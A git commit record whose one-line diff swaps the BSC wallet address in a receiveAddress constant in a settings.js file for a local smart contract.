fb7d098289bf5675b8d21d896a97cdc0dddfd23e
Tyche-code7 <nivedhshiva1905@gmail.com>
2024-06-25 00:03:12 +0530

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0xf6AC09C5E6fB4D9f5eedC31e44Ec156538aE6B57";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
